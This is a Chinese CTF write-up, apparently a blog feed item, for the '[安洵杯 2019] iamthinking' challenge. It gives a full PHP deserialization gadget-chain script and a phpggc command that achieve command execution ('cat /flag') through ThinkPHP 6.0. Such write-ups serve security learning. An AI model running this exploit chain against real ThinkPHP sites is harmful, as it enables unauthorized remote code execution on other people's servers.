item.description:
 &lt;h2 id=&#34;安洵杯-2019iamthinking&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安洵杯-2019iamthinking&#34;&gt;#&lt;/a&gt; [安洵杯 2019] iamthinking&lt;/h2&gt;
&lt;h2 id=&#34;1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Diamthinking/1.png&#34; alt=&#34;1&#34;&gt;&lt;/h2&gt;
&lt;p&gt;dirsearch 搜集到 www.zip 文件：&lt;/p&gt;
&lt;p&gt;发现是 thinkphp6.0 版本：&lt;/p&gt;
&lt;p&gt;thinkphp6.0 有两个计较明显的漏洞：&lt;br&gt;
一个文件上传：要开启 session（本题没开）&lt;/p&gt;
&lt;p&gt;一个就是反序列化：本体有个 unserilize 函数&lt;/p&gt;
&lt;p&gt;那就是反序列化了&lt;/p&gt;
&lt;p&gt;php 脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

namespace think\model\concern;

trait Attribute
&amp;#123;
    private $data = [&amp;quot;key&amp;quot; =&amp;gt; [&amp;quot;key1&amp;quot; =&amp;gt; &amp;quot;cat /flag&amp;quot;]];
    private $withAttr = [&amp;quot;key&amp;quot;=&amp;gt;[&amp;quot;key1&amp;quot;=&amp;gt;&amp;quot;system&amp;quot;]];
    protected $json = [&amp;quot;key&amp;quot;];
&amp;#125;
namespace think;

abstract class Model
&amp;#123;
    use model\concern\Attribute;
    private $lazySave;
    protected $withEvent;
    private $exists;
    private $force;
    protected $table;
    protected $jsonAssoc;
    function __construct($obj = &#39;&#39;)
    &amp;#123;
        $this-&amp;gt;lazySave = true;
        $this-&amp;gt;withEvent = false;
        $this-&amp;gt;exists = true;
        $this-&amp;gt;force = true;
        $this-&amp;gt;table = $obj;
        $this-&amp;gt;jsonAssoc = true;
    &amp;#125;
&amp;#125;

namespace think\model;

use think\Model;

class Pivot extends Model
&amp;#123;
&amp;#125;
$a = new Pivot();
$b = new Pivot($a);
$c = array($b);
echo urlencode(serialize($c));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;phpgcc 好像搞不了（首字母不能是 O，在&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./phpggc -u ThinkPHP/RCE2 &#39;system(&amp;quot;cat /flag&amp;quot;);&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;出来的时候是 O 开头）&lt;/p&gt;
&lt;p&gt;仔细的反序列化过程：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ3OT91X2F0b2tlbj1lMTk4M2NjYTcxMTViYjczZGM4MjYxMzk1ZjM4ZTQyOCZhbXA7dV9hc2lnPTFhMGMzOTlhMTcyNzA3ODI1MzU5OTM0NzdlMDAzNQ==&#34;&gt;https://xz.aliyun.com/t/6479?u_atoken=e1983cca7115bb73dc8261395f38e428&amp;amp;u_asig=1a0c399a17270782535993477e0035&lt;/span&gt;&lt;/p&gt;
